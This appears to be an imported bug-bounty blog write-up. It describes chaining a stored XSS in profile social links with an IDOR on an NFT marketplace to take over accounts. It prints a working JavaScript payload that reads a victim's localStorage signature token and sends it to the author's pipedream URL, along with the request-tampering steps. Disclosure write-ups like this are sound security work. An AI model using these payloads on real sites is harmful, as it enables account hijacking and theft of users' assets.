---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-26_account-takeover-unraveling-idor-stored-xss-flaws-in-an-nft-marketplace.md
original_filename: 2023-06-26_account-takeover-unraveling-idor-stored-xss-flaws-in-an-nft-marketplace.md
title: 'Account Takeover: Unraveling IDOR + Stored XSS Flaws in an NFT Marketplace'
category: documents
detected_topics:
- xss
- idor
- command-injection
- otp
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- idor
- command-injection
- otp
- api-security
- cloud-security
language: en
raw_sha256: 863fc3a0ecf40a190560059837e3c7153656d2aef163b3ecff5c35366da7805a
text_sha256: 7700dfc8fbfaabe932f3053b9fa6150a41ea96e53b4f1a03d0db948b84e57065
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# Account Takeover: Unraveling IDOR + Stored XSS Flaws in an NFT Marketplace

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-26_account-takeover-unraveling-idor-stored-xss-flaws-in-an-nft-marketplace.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, otp, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `863fc3a0ecf40a190560059837e3c7153656d2aef163b3ecff5c35366da7805a`
- Text SHA256: `7700dfc8fbfaabe932f3053b9fa6150a41ea96e53b4f1a03d0db948b84e57065`


## Content

---
title: "Account Takeover: Unraveling IDOR + Stored XSS Flaws in an NFT Marketplace"
url: "https://medium.com/@pratiky054/account-takeover-unraveling-idor-stored-xss-flaws-in-an-nft-marketplace-158679660fa7"
authors: ["Pratik Yadav (@PratikY9967)"]
bugs: ["IDOR", "Stored XSS", "Account takeover"]
publication_date: "2023-06-26"
added_date: "2023-06-27"
source: "pentester.land/writeups.json"
original_index: 1008
scraped_via: "browseros"
---

# Account Takeover: Unraveling IDOR + Stored XSS Flaws in an NFT Marketplace

Top highlight

Account Takeover: Unraveling IDOR + Stored XSS Flaws in an NFT Marketplace
pratik yadav
Follow
5 min read
·
Jun 26, 2023

345

8

Hi Everyone,
I hope you are well :) Note I haven’t used chatgpt to write this blog for me 🙂so I hope you all ignore any grammatical errors. Well, it's a while since I have shared anything with the information security community so here is an exciting security issue I discovered in an NFT marketplace that allowed me to take over anyone's account by chaining IDOR and XSS to achieve a complete account takeover vulnerability.

We will cover each vulnerability with the actual flow and then chain all these issues

XSS →IDOR → Account takeover

Let's start with XSS first

Note: We will call our target application vulnerablemarketplace.com

About this application: In this application, every request is validated with a signature which acts like a cookie or authentication header.

Vulnerability 1: Stored XSS

Like every other application, it has a profile section where users can upload profile pictures / upload art/ Update bios/ Email / Add social links like Instagram or Telegram

so the very basic step I did was to save my Twitter and Instagram link as javascript:alert(document.domain) , when I saved my info and clicked on Twitter or Instagram icon javascript got executed which confirmed we have a working stored XSS in the nft marketplace

Steps to reproduce

Login to my vulnerablemarketplace.com nft account with the wallet
Then navigated to my profile settings and saved my Instagram and Twitter link as javascript:alert(document.domain)

Here is the post request:

3. So whenever we click on our profile Twitter or Instagram icon XSS will be executed

Vulnerability 2: Idor to Modify profile details of any users

About the vulnerability: Attackers can modify users' profile information including contact email, Twitter or Instagram link, only requirement here is we need to get the victim's wallet address (Which is already public information on the blockchain as every user do share a wallet address to some or other person).

Requirements: Victims wallet address (This we can easily get as users do share this with other users and address is a public information )

Steps to reproduce

Setup: I created two accounts A. Attacker B. Victim (Copied victims wallet address)

The attacker connects his wallet to vulnerablemarketplace.com
Go to his profile settings and enter any random information on email , Twitter link, and captures the request in any proxy tool(BURP)
Some parameters in this post request that is really interesting as attacker's point of view are acccount_address, signer, and signature.

account_address= users wallet address

Get pratik yadav’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

signer= same as account address

signature= acts like a auth token or cookie to properly validate users' requests

4. I modified the account_address of the attackers with the account address of the victim and sent the request

Press enter or click to view image in full size

5. And YES!!!! we were able to modify the victim users profiles with our own values . We were able to modify victims' email,Twitter , Instagram link with our own control values

Note: Some of you may have a question that if we are able to modify the email of the victim then there is already an account takeover 🧐 ? No since this is an NFT application there is no email authentication in place we have to connect using a wallet extension (We need to steal victims signature so we can use it to steal nft or artwork )

Chaining Vulnerability 1 + Vulnerability 2

By now we already have an IDOR and a Stored XSS. I could have just shared my profile with other users to steal the data but by chaining this IDOR we can modify the profile details of very high reputable users to increase the impact

Things to remember: Application doesn’t has cookies but stores the signature value in the browser localStorage so we will craft the payload to steal that signature values

Steps to reproduce

Capture the POST Request of changing your profile information in proxy tool such as Burp
Modify the instagram and twitter link to this payload.
We are particularly interested in the signature value as this is required to make every request . Signature value is stored in the localStorage so here is the javascript payload which we will be using to steal that value and send it to our pipedream url

javascript:token=JSON.stringify(localStorage),url=’https://mypipedream.m.pipedream.net/'+token,fetch(url)

4. Modify the account_address to victim's wallet address

Press enter or click to view image in full size

5. Send the request and done :) As soon as the victim will be clicking on his instagram or twitter link or by the users visit victim users profile XSS will be executed and the signature value of users will be leaked to my server

Now you can see we have stolen victims signature using XSS . Now we can make any other requests to perform other authenticated operations like selling the art or transferring it or deleting the art work of users

Disclosure

Press enter or click to view image in full size

Thank you so much for taking the time to read this blog post. It’s because of engaged readers like you that we’re able to shed light on critical vulnerabilities and enhance security measures. Let’s continue to foster this community of knowledge-sharing, creating a safer digital space for everyone. Stay tuned for more insightful posts, and remember: stay secure, and stay vigilant.

Best Regards

Pratik Yadav
